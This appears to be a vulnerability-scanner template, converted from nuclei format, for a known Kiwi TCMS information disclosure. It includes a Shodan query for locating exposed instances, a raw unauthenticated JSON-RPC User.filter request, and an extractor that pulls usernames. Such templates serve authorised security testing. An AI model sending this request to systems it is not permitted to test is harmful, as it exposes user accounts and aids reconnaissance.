@@ -1,0 +1,159 @@
+{
+  "id": "kiwitcms-json-rpc",
+  "name": "Kiwi TCMS Information Disclosure",
+  "author": "act1on3",
+  "severity": "HIGH",
+  "description": "Internal info exposed in Kiwi TCMS.",
+  "references": [
+    "https://hackerone.com/reports/968402",
+    "https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/",
+    "https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml"
+  ],
+  "tags": [
+    "kiwitcms",
+    "exposure",
+    "misconfig",
+    "hackerone"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"Kiwi TCMS - Login\" http.favicon.hash:-1909533337"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /json-rpc/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\n\n{\"jsonrpc\":\"2.0\",\"method\":\"User.filter\",\"id\": 1,\"params\":{\"query\":{\"is_active\":true}}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "result",
+            "username",
+            "jsonrpc",
+            "is_active"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "kiwitcms-json-rpc",
+    "info": {
+      "name": "Kiwi TCMS Information Disclosure",
+      "author": "act1on3",
+      "severity": "high",
+      "description": "Internal info exposed in Kiwi TCMS.",
+      "reference": [
+        "https://hackerone.com/reports/968402",
+        "https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/",
+        "https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"Kiwi TCMS - Login\" http.favicon.hash:-1909533337"
+      },
+      "tags": "kiwitcms,exposure,misconfig,hackerone"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /json-rpc/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\n\n{\"jsonrpc\":\"2.0\",\"method\":\"User.filter\",\"id\": 1,\"params\":{\"query\":{\"is_active\":true}}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "result",
+              "username",
+              "jsonrpc",
+              "is_active"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ],
+        "extractors": [
+          {
+            "type": "json",
+            "json": [
+              ".result[].username"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
